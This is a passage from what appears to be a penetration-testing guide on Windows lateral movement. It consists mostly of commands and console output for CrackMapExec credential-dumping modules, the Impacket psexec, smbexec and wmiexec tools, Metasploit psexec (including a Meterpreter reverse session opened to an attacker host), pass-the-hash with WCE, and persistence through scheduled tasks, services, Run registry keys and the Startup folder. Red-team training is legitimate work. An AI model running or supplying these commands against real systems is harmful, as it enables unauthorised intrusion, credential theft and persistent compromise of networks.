<span class="go">                      Method to execute the command. Ignored if in MSSQL mode (default: wmiexec)</span>
<span class="go">--force-ps32          Force the PowerShell command to run in a 32-bit process</span>
<span class="go">--no-output           Do not retrieve command output</span>
<span class="go">-x COMMAND            Execute the specified command</span>
<span class="go">-X PS_COMMAND         Execute the specified PowerShell command</span>
</pre></div>
</div>
</section>
<section id="modules">
<h4>Modules<a class="headerlink" href="#modules" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">crackmapexec smb -L</span>

<span class="go">[*] empire_exec               Uses Empire&#39;s RESTful API to generate a launcher for the specified listener and executes it</span>
<span class="go">[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI</span>
<span class="go">[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump</span>
<span class="go">[*] get_keystrokes            Logs keys pressed, time and the active window</span>
<span class="go">[*] get_netdomaincontroller   Enumerates all domain controllers</span>
<span class="go">[*] get_netrdpsession         Enumerates all active RDP sessions</span>
<span class="go">[*] get_timedscreenshot       Takes screenshots at a regular interval</span>
<span class="go">[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.</span>
<span class="go">[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.</span>
<span class="go">[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</span>
<span class="go">[*] invoke_vnc                Injects a VNC client in memory</span>
<span class="go">[*] met_inject                Downloads the Meterpreter stager and injects it into memory</span>
<span class="go">[*] mimikatz                  Dumps all logon credentials from memory</span>
<span class="go">[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz</span>
<span class="go">[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager</span>
<span class="go">[*] mimikittenz               Executes Mimikittenz</span>
<span class="go">[*] multirdp                  Patches terminal services in memory to allow multiple RDP users</span>
<span class="go">[*] netripper                 Capture&#39;s credentials by using API hooking</span>
<span class="go">[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory</span>
<span class="go">[*] rdp                       Enables/Disables RDP</span>
<span class="go">[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory</span>
<span class="go">[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions</span>
<span class="go">[*] test_connection           Pings a host</span>
<span class="go">[*] tokens                    Enumerates available tokens</span>
<span class="go">[*] uac                       Checks UAC status</span>
<span class="go">[*] wdigest                   Creates/Deletes the &#39;UseLogonCredential&#39; registry key enabling WDigest cred dumping on Windows &gt;= 8.1</span>
<span class="go">[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module</span>
</pre></div>
</div>
<p>Using a module</p>
<p>Simply specify the module name with the -M flag:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -M mimikatz</span>
<span class="go">06-05-2016 14:13:59 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)</span>
</pre></div>
</div>
<p>Use the -M flag to specify the module and the –options argument to view the module’s supported options:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">#</span>~<span class="w"> </span>crackmapexec<span class="w"> </span>-M<span class="w"> </span>mimikatz<span class="w"> </span>--options
<span class="go">06-05-2016 14:10:33 [*] mimikatz module options:</span>
<span class="go">COMMAND Mimikatz command to execute (default: &#39;sekurlsa::logonpasswords&#39;)</span>
</pre></div>
</div>
<p>Using module options
Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -M mimikatz -o COMMAND=privilege::debug</span>
</pre></div>
</div>
</section>
</section>
<section id="smbmap">
<h3>Smbmap<a class="headerlink" href="#smbmap" title="Link to this heading"></a></h3>
<p>smbmap an inbuilt tool in kali linux which gives some awesome results while gathering information related to the shares associated to with a particular user. As compared to the crackmapexec we can also use smbmap in order to verify the credentials gathered. This can not only be used to map the shares but can also be used for running remote commands by specifying the ‘-x’ flag.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">smbmap -H 192.168.4.32 -d ABC.com -u Administrat0r -p P@ssw0rd!</span>
<span class="go">[+] Finding open SMB ports....</span>
<span class="go">[+] User SMB session established on 192.168.4.32...</span>
<span class="go">[+] IP: 10.7.3.2:445  Name: dcrs.ABC.com</span>
<span class="go">      Disk                                                    Permissions</span>
<span class="go">      ----                                                    -----------</span>
<span class="go">      ADMIN$                                                  READ, WRITE</span>
<span class="go">      C$                                                      READ, WRITE</span>
<span class="go">      IPC$                                                    READ ONLY</span>
<span class="go">      NETLOGON                                                READ, WRITE</span>
<span class="go">      SYSVOL                                                  READ, WRITE</span>
<span class="go">      [!] Unable to remove test directory at \\192.168.4.32\SYSVOL\BiZyIseFGv, please remove manually.</span>
</pre></div>
</div>
</section>
<section id="impacket-psexec-smbexe-wmiexec">
<h3>Impacket psexec/ smbexe/ wmiexec<a class="headerlink" href="#impacket-psexec-smbexe-wmiexec" title="Link to this heading"></a></h3>
<section id="impacket-psexec">
<h4>Impacket psexec<a class="headerlink" href="#impacket-psexec" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">./psexec.py -debug Admini:Password@10.0.X.X</span>

<span class="go">Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies</span>

<span class="go">[*] Trying protocol 445/SMB...</span>
<span class="go">[*] Requesting shares on 10.0.5.180.....</span>
<span class="go">[*] Found writable share ADMIN$</span>
<span class="go">[*] Uploading file kBibbkKL.exe</span>
<span class="go">[*] Opening SVCManager on 10.0.5.180.....</span>
<span class="go">[*] Creating service cvZN on 10.0.5.180.....</span>
<span class="go">[*] Starting service cvZN.....</span>
<span class="go">[-] Pipe not ready, aborting</span>
<span class="go">[*] Opening SVCManager on 10.0.5.180.....</span>
<span class="go">[*] Stoping service cvZN.....</span>
<span class="go">[*] Removing service cvZN.....</span>
<span class="go">[*] Removing file kBibbkKL.exe.....</span>
</pre></div>
</div>
</section>
<section id="impacket-smbexec">
<h4>Impacket smbexec<a class="headerlink" href="#impacket-smbexec" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">./smbexec.py -debug Admini:Password@10.0.5.180</span>

<span class="go">Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies</span>

<span class="go">[+] StringBinding ncacn_np:10.0.5.180[\pipe\svcctl]</span>
<span class="go">[+] Executing %COMSPEC% /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span>
<span class="go">[!] Launching semi-interactive shell - Careful what you execute</span>

<span class="go">C:\Windows\system32&gt;ipconfig</span>
<span class="go">[+] Executing %COMSPEC% /Q /c echo ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span>

<span class="go">Windows IP Configuration</span>


<span class="go">Ethernet adapter Local Area Connection:</span>

<span class="go">Connection-specific DNS Suffix  . :</span>
<span class="go">Link-local IPv6 Address . . . . . : fe80::4546:b672:307:b488%10</span>
<span class="go">IPv4 Address. . . . . . . . . . . : 10.0.X.XX</span>
<span class="go">Subnet Mask . . . . . . . . . . . : 255.255.254.0</span>
<span class="go">Default Gateway . . . . . . . . . : 10.0.X.1</span>

<span class="go">Tunnel adapter isatap.{EB92DEE7-521B-4E14-84C2-0E9B9E96563E}:</span>

<span class="go">Media State . . . . . . . . . . . : Media disconnected</span>
<span class="go">Connection-specific DNS Suffix  . :</span>

<span class="go">Tunnel adapter Local Area Connection* 11:</span>

<span class="go">Media State . . . . . . . . . . . : Media disconnected</span>
<span class="go">Connection-specific DNS Suffix  . :</span>

<span class="go">C:\Windows\system32&gt;</span>
</pre></div>
</div>
</section>
<section id="impacket-wmiexec">
<h4>Impacket wmiexec<a class="headerlink" href="#impacket-wmiexec" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies</span>

<span class="go">usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-debug]</span>
<span class="go">                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]</span>
<span class="go">                  [-dc-ip ip address]</span>
<span class="go">                  target [command [command ...]]</span>

<span class="go">Executes a semi-interactive shell using Windows Management Instrumentation.</span>

<span class="go">positional arguments:</span>
<span class="go">  target                [[domain/]username[:password]@]&lt;targetName or address&gt;</span>
<span class="go">  command               command to execute at the target. If empty it will</span>
<span class="go">                        launch a semi-interactive shell</span>

<span class="go">authentication:</span>
<span class="go">  -hashes LMHASH:NTHASH</span>
<span class="go">                        NTLM hashes, format is LMHASH:NTHASH</span>
<span class="go">  -no-pass              don&#39;t ask for password (useful for -k)</span>
<span class="go">  -k                    Use Kerberos authentication. Grabs credentials from</span>
<span class="go">                        ccache file (KRB5CCNAME) based on target parameters.</span>
<span class="go">                        If valid credentials cannot be found, it will use the</span>
<span class="go">                        ones specified in the command line</span>
<span class="go">  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256</span>
<span class="go">                        bits)</span>
<span class="go">  -dc-ip ip address     IP Address of the domain controller. If ommited it use</span>
<span class="go">                        the domain part (FQDN) specified in the target</span>
<span class="go">                        parameter</span>
</pre></div>
</div>
<p><strong>Example with password</strong></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmiexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180</span>

<span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies</span>

<span class="go">[*] SMBv2.1 dialect used</span>
<span class="go">[+] Target system is 10.0.5.180 and isFDQN is False</span>
<span class="go">[+] StringBinding: \\\\xxxxHBKS1739[\\PIPE\\atsvc]</span>
<span class="go">[+] StringBinding: xxxxhbks1739[49155]</span>
<span class="go">[+] StringBinding: 10.0.5.180[49155]</span>
<span class="go">[+] StringBinding chosen: ncacn_ip_tcp:10.0.5.180[49155]</span>
<span class="go">[!] Launching semi-interactive shell - Careful what you execute</span>
<span class="go">[!] Press help for extra shell commands</span>
<span class="go">C:\&gt;hostname</span>
<span class="go">xxxxhbks1739</span>

<span class="go">C:\&gt;whoami</span>
<span class="go">xxxxhbks1739\administrat0r</span>

<span class="go">C:\&gt;</span>
</pre></div>
</div>
<p><strong>Example with hashes</strong></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmiexec.py -debug -hashes xxxxxxxxxxxxxx:xxxxxxx  Administrat0r@10.0.5.180</span>
</pre></div>
</div>
</section>
</section>
<section id="metasploit-psexec">
<h3>Metasploit psexec<a class="headerlink" href="#metasploit-psexec" title="Link to this heading"></a></h3>
<p>Metasploit psexec have three methods to invoke,</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf exploit(psexec) &gt; show targets</span>

<span class="go">Exploit targets:</span>

<span class="go">Id  Name</span>
<span class="go">--  ----</span>
<span class="go"> 0   Automatic</span>
<span class="go"> 1   PowerShell</span>
<span class="go"> 2   Native upload</span>
<span class="go"> 3   MOF upload</span>
</pre></div>
</div>
<section id="target-2-native-upload">
<h4>Target 2: Native upload<a class="headerlink" href="#target-2-native-upload" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf exploit(psexec) &gt; set target 2</span>
<span class="go">target =&gt; 2</span>

<span class="go">[*] Started reverse TCP handler on 10.11.43.116:4444</span>
<span class="go">[*] 10.0.5.180:445 - Connecting to the server...</span>
<span class="go">[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...</span>
<span class="go">[*] 10.0.5.180:445 - Uploading payload...</span>
<span class="go">[*] 10.0.5.180:445 - Created \hnFrgUVk.exe...</span>
<span class="go">[-] 10.0.5.180:445 - Service failed to start - ACCESS_DENIED</span>
<span class="go">[*] 10.0.5.180:445 - Deleting \hnFrgUVk.exe...</span>
<span class="go">[*] Exploit completed, but no session was created.</span>
</pre></div>
</div>
<p>We can see that the exploit was completed however, no session was created. Also the antivirus provided an alert.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Datei &quot;C:\Windows\hnFrgUVk.exe&quot; belongs to virus/spyware &#39;Troj/Swrort-K&#39;.</span>
</pre></div>
</div>
<p>Let’s try with</p>
</section>
<section id="target-1-powershell">
<h4>Target 1, powershell<a class="headerlink" href="#target-1-powershell" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf exploit(psexec) &gt; set smbdomain .</span>
<span class="go">smbdomain =&gt; .</span>
<span class="go">msf exploit(psexec) &gt; set smbuser Administrat0r</span>
<span class="go">smbuser =&gt; Administrat0r</span>
<span class="go">msf exploit(psexec) &gt; set smbpass Passw0rd!!</span>
<span class="go">smbpass =&gt; Passw0rd!!</span>
<span class="go">msf exploit(psexec) &gt; set rhost 10.0.5.180</span>
<span class="go">rhost =&gt; 10.0.5.180</span>
<span class="go">msf exploit(psexec) &gt; run</span>

<span class="go">[*] Started reverse TCP handler on 10.11.43.116:4444</span>
<span class="go">[*] 10.0.5.180:445 - Connecting to the server...</span>
<span class="go">[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...</span>
<span class="go">[*] 10.0.5.180:445 - Selecting PowerShell target</span>
<span class="go">[*] 10.0.5.180:445 - Executing the payload...</span>
<span class="go">[+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...</span>
<span class="go">[*] Exploit completed, but no session was created.</span>
<span class="go">msf exploit(psexec) &gt; run</span>

<span class="go">[*] Started reverse TCP handler on 10.11.43.116:4444</span>
<span class="go">[*] 10.0.5.180:445 - Connecting to the server...</span>
<span class="go">[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...</span>
<span class="go">[*] 10.0.5.180:445 - Selecting PowerShell target</span>
<span class="go">[*] 10.0.5.180:445 - Executing the payload...</span>
<span class="go">[+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...</span>
<span class="go">[*] Sending stage (957487 bytes) to 10.0.5.180</span>
<span class="go">[*] Meterpreter session 1 opened (10.11.43.116:4444 -&gt; 10.0.5.180:64783) at 2017-02-20 16:31:41 +0530</span>

<span class="go">meterpreter &gt;</span>
</pre></div>
</div>
<p>Let’s try also with</p>
</section>
<section id="target-3-mof-upload">
<h4>Target 3: MOF Upload<a class="headerlink" href="#target-3-mof-upload" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf exploit(psexec) &gt; set target 3</span>
<span class="go">target =&gt; 3</span>

<span class="go">[*] Started reverse TCP handler on 10.11.43.116:4444</span>
<span class="go">[*] 10.0.5.180:445 - Connecting to the server...</span>
<span class="go">[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...</span>
<span class="go">[*] 10.0.5.180:445 - Trying wbemexec...</span>
<span class="go">[*] 10.0.5.180:445 - Uploading Payload...</span>
<span class="go">[*] 10.0.5.180:445 - Created %SystemRoot%\system32\KiaHTgBg.exe</span>
<span class="go">[*] 10.0.5.180:445 - Uploading MOF...</span>
<span class="go">[*] 10.0.5.180:445 - Created %SystemRoot%\system32\wbem\mof\5SZ1WZENmHyays.MOF</span>
<span class="go">[*] Exploit completed, but no session was created.</span>
</pre></div>
</div>
</section>
<section id="working-of-msf-psexec-native-upload">
<h4>Working of MSF PSexec - Native Upload<a class="headerlink" href="#working-of-msf-psexec-native-upload" title="Link to this heading"></a></h4>
<p>Jonathan has already written awesome detailed blog <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a> Working of MSF PSExec has been taken from his blog directly.</p>
<p>While similar in functionality to Sysinternal’s PsExec, the Metasploit Framework’s PSExec Module has a few key differences and at a high-level performs the following actions.  By default, the module takes the following actions:</p>
<ul class="simple">
<li><p>Creates a randomly-named service executable with an embedded payload</p></li>
<li><p>Connects to the hidden ADMIN$ share on the remote system via SMB</p></li>
<li><p>Drops malicious service executable onto the share</p></li>
<li><p>Utilizes the SCM to start a randomly-named service</p></li>
<li><p>Service loads the malicious code into memory and executes it</p></li>
<li><p>Metasploit payload handler receives payload and establishes session</p></li>
<li><p>Module cleans up after itself, stopping the service and deleting the executable</p></li>
</ul>
<p>There is more flexibility with the Metasploit’s PSExec in comparison to Microsoft’s tool.  For instance, the default location of the malicious service executable can be modified from the hidden ADMIN$ to C$ or even another shared folder on the target machine.  Names of the service executable and associated service can also be changed under the module’s Advanced settings.</p>
<p>However, the most important modification that a penetration tester can make is creating and linking to a custom service executable instead of relying on the executable templates provided by the Metasploit Framework.  Failure to do so greatly increases the risk of detection by the target system’s anti-virus solution once the executable is dropped to disk.</p>
</section>
<section id="working-of-msf-psexec-powershell">
<h4>Working of MSF PSExec - Powershell<a class="headerlink" href="#working-of-msf-psexec-powershell" title="Link to this heading"></a></h4>
<p>Details taken directly from Jonathan blog <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a></p>
<p>At a high-level, the psexec_psh module works as follows:</p>
<ul class="simple">
<li><p>Embed stager into a PowerShell script that will inject the payload into memory</p></li>
<li><p>Compress and Base64 encode the PowerShell script</p></li>
<li><p>Wrap encoded script into a PowerShell one-liner that decodes and deflates</p></li>
<li><p>Connect to ADMIN$ share on target machine over SMB and run the one-liner</p></li>
<li><p>Embedded script is passed into memory via PowerShell’s Invoke-Expression (IEX)</p></li>
<li><p>Script creates a new service and passes stager payload into it</p></li>
<li><p>Metasploit payload handler receives payload and establishes session</p></li>
<li><p>Module cleans up after itself by tearing down the service</p></li>
</ul>
</section>
</section>
<section id="sysinternals-psexec">
<h3>Sysinternals psexec<a class="headerlink" href="#sysinternals-psexec" title="Link to this heading"></a></h3>
<p>Microsoft Sysinternal tool psexec can be downloaded from <a class="reference external" href="https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx">PsExec</a>. Mark has written a good article on how psexec works is <a class="reference external" href="http://windowsitpro.com/systems-management/psexec">PsExec Working</a>.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">psexec.exe \\Computername -u DomainName\username -p password &lt;command&gt;</span>
<span class="go">command can be cmd.exe/ ipconfig etc.</span>
</pre></div>
</div>
<section id="working-of-microsoft-psexec">
<h4>Working of Microsoft PSExec<a class="headerlink" href="#working-of-microsoft-psexec" title="Link to this heading"></a></h4>
<p>The below details are taken from Jonathan blog on <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a></p>
<p>At a high-level, the PsExec program works as follows:</p>
<ul class="simple">
<li><p>Connects to the hidden ADMIN$ share (mapping to the C:Windows folder) on the remote system via SMB</p></li>
<li><p>Utilizes the Service Control Manager (SCM) to start the PsExecsvc service and enable a named pipe on the remote system</p></li>
<li><p>Input/output redirection of the console is achieved via the created named pipe</p></li>
</ul>
</section>
<section id="sysinternal-psexec-with-hashes">
<h4>Sysinternal PSExec with hashes<a class="headerlink" href="#sysinternal-psexec-with-hashes" title="Link to this heading"></a></h4>
<p>Sysinternal PSExec is a tool built to assist system administrators. In order to use PsExec with captured hashes, we would require Windows Credential Editor (WCE).  This would require us to drop another executable to disk and risk detection. Fuzzynop has provided a tutorial <a class="reference external" href="http://fuzzynop.blogspot.in/2012/09/pass-hash-without-metasploit.html">Pass the Hash without Metasploit</a></p>
<ul class="simple">
<li><p>Change the current NTLM credentials</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wce.exe -s &lt;username&gt;:&lt;domain&gt;:&lt;lmhash&gt;:&lt;nthash&gt;</span>
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C:\Users\test&gt;wce.exe -s testuser:amplialabs:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537</span>

<span class="go">WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)</span>
<span class="go">Use -h for help.</span>

<span class="go">Changing NTLM credentials of current logon session (00024E1Bh) to:</span>
<span class="go">Username: testuser</span>
<span class="go">domain: amplialabs</span>
<span class="go">LMHash: 01FC5A6BE7BC6929AAD3B435B51404EE</span>
<span class="go">NTHash: 0CB6948805F797BF2A82807973B89537</span>
<span class="go">NTLM credentials successfully changed!</span>


<span class="go">C:\Users\test&gt;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Run PSExec normally</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">psexec \\remotecomputer &lt;commandname&gt;</span>
</pre></div>
</div>
<p>If you omit a user name, the process will run in the context of your account on the remote system, but will not have access to network resources (because it is impersonating). Specify a valid user name in the DomainUser syntax if the remote process requires access to network resources or to run in a different account. Since, we are omitting the username, it would run in the context of the current username ( The one we have changed with the help of WCE )</p>
</div></blockquote>
</section>
</section>
<section id="task-scheduler">
<h3>Task Scheduler<a class="headerlink" href="#task-scheduler" title="Link to this heading"></a></h3>
<p>If you are the administrator of the remote machine and using runas /netonly, we can utilize AT to run commands remotely. Using AT, a command to be run at designated time(s) as SYSTEM.</p>
<section id="examples">
<h4>Examples<a class="headerlink" href="#examples" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">AT \\REMOTECOMPUTERNAME 12:34 &quot;command to run&quot;</span>
</pre></div>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">AT \\REMOTECOMPUTERNAME 12:34 cmd.exe \c &quot;command to run&quot;</span>

<span class="go">&quot;command to run&quot; can be web-delivery string or powershell empire string.</span>
</pre></div>
</div>
<p>If we need to delete the AT jobs, we can use</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">AT \\REMOTECOMPUTERNAME id /delete /yes</span>
</pre></div>
</div>
<p>However, sometimes doing it remotely, we need to figure out the time of the remote computer, we can utilize NET TIME</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">NET TIME \\REMOTECOMPUTERNAME</span>
</pre></div>
</div>
</section>
</section>
<section id="scheduled-tasks">
<h3>Scheduled Tasks<a class="headerlink" href="#scheduled-tasks" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://technet.microsoft.com/en-us/library/cc725744(v=ws.11).aspx">Schtasks</a> Schedules commands and programs to run periodically or at a specific time. Adds and removes tasks from the schedule, starts and stops tasks on demand, and displays and changes scheduled tasks. Schtasks replaces At.exe, a tool included in previous versions of Windows. Although At.exe is still included in the Windows Server 2003 family, schtasks is the recommended command-line task scheduling tool.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">schtasks /create /sc &lt;ScheduleType&gt; /tn &lt;TaskName&gt; /tr &lt;TaskRun&gt; [/s &lt;Computer&gt; [/u [&lt;Domain&gt;\]&lt;User&gt; [/p &lt;Password&gt;]]] [/ru {[&lt;Domain&gt;\]&lt;User&gt; | System}] [/rp &lt;Password&gt;] [/mo &lt;Modifier&gt;] [/d &lt;Day&gt;[,&lt;Day&gt;...] | *] [/m &lt;Month&gt;[,&lt;Month&gt;...]] [/i &lt;IdleTime&gt;] [/st &lt;StartTime&gt;] [/ri &lt;Interval&gt;] [{/et &lt;EndTime&gt; | /du &lt;Duration&gt;} [/k]] [/sd &lt;StartDate&gt;] [/ed &lt;EndDate&gt;] [/it] [/z] [/f]</span>

<span class="go">/sc &lt;ScheduleType&gt;               : Specifies the schedule type. Valid values are MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE.</span>
<span class="go">/tn &lt;TaskName&gt;                   : Specifies a name for the task.</span>
<span class="go">/tr &lt;TaskRun&gt;                    : Specifies the program or command that the task runs. Type the fully qualified path and file name of an executable file, script file, or batch file. If you omit the path, schtasks assumes that the file is in the SystemRoot\System32 directory.</span>
<span class="go">/s &lt;Computer&gt;                    : Schedules a task on the specified remote computer. Type the name or IP address of a remote computer (with or without backslashes). The default is the local computer.</span>
<span class="go">/u [&lt;Domain&gt;\]&lt;User&gt;             : Runs this command with the permissions of the specified user account. The default is the permissions of the current user of the local computer.</span>
<span class="go">/p &lt;Password&gt;                    : Provides the password for the user account specified in the /u parameter. If you use the /u parameter, but omit the /p parameter or the password argument, schtasks prompts you for a password and obscures the text you type</span>
<span class="go">/ru {[&lt;Domain&gt;\]&lt;User&gt; | System} : Runs the task with permissions of the specified user account. By default, the task runs with the permissions of the current user of the local computer, or with the permission of the user specified by the /u parameter, if one is included. The /ru parameter is valid when scheduling tasks on local or remote computers.</span>
<span class="go">/rp &lt;Password&gt;                   : Provides the password for the user account that is specified in the /ru parameter. If you omit this parameter when specifying a user account, SchTasks.exe prompts you for the password and obscures the text you type. Do not use the /rp parameter for tasks run with System account credentials (/ru System). The System account does not have a password and SchTasks.exe does not prompt for one.</span>
</pre></div>
</div>
<section id="id16">
<h4>Examples<a class="headerlink" href="#id16" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Create new task and execute it</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System</span>
<span class="go">schtasks /run /tn foobar /S host</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Delete the task after it is executed</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">schtasks /F /delete /tn foobar /S host</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
<section id="service-controller-sc">
<h3>Service Controller (SC)<a class="headerlink" href="#service-controller-sc" title="Link to this heading"></a></h3>
<p>Communicates with the Service Controller and installed services. SC.exe retrieves and sets control information about services. Armitage Hacker has mentioned this at his blog <a class="reference external" href="https://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/">Lateral Movement with High Latency</a></p>
<section id="create-a-new-service">
<h4>Create a new service<a class="headerlink" href="#create-a-new-service" title="Link to this heading"></a></h4>
<p>Create a new service named foobar</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sc \\host create foobar binpath= “c:\windows\temp\foobar.exe”</span>
</pre></div>
</div>
</section>
<section id="start-the-service">
<h4>Start the service<a class="headerlink" href="#start-the-service" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sc \\host start foobar</span>
</pre></div>
</div>
<p>The sc command requires an executable that responds to Service Control Manager commands. If you do not provide such an executable, your program will run, and then immediately exit.</p>
</section>
<section id="delete-the-service">
<h4>Delete the service<a class="headerlink" href="#delete-the-service" title="Link to this heading"></a></h4>
<p>Delete the service after it runs</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sc \\host delete foobar</span>
</pre></div>
</div>
</section>
</section>
<section id="remote-registry">
<h3>Remote Registry<a class="headerlink" href="#remote-registry" title="Link to this heading"></a></h3>
<p>A command to be run or DLL to be loaded when specific events occur, such as boot or login or process execution, as active user or SYSTEM.</p>
<p><strong>Examples</strong></p>
<section id="add-an-entry">
<h4>Add an entry<a class="headerlink" href="#add-an-entry" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">REG ADD \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t REG_SZ /d &quot;command to run&quot;</span>
</pre></div>
</div>
<p>Command will run every time a user logs in as the user.</p>
</section>
<section id="query-the-remote-registry">
<h4>Query the remote registry<a class="headerlink" href="#query-the-remote-registry" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">REG QUERY \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry</span>
</pre></div>
</div>
</section>
<section id="delete-the-remote-registry">
<h4>Delete the remote registry<a class="headerlink" href="#delete-the-remote-registry" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">REG DELETE \\REMOTECOMPUTERNAME\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry</span>
</pre></div>
</div>
</section>
</section>
<section id="remote-file-access">
<h3>Remote File Access<a class="headerlink" href="#remote-file-access" title="Link to this heading"></a></h3>
<p>We can copy a launcher.bat file with powershell empire and drop it Startup folder, so that it executes every time a user logs in as a user.</p>
<section id="id17">
<h4>Example<a class="headerlink" href="#id17" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">xcopy executabletorun.exe &quot;\\REMOTECOMPUTERNAME\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat&quot;</span>
</pre></div>
</div>
</section>
</section>
<section id="winrm">
<h3>WinRM<a class="headerlink" href="#winrm" title="Link to this heading"></a></h3>
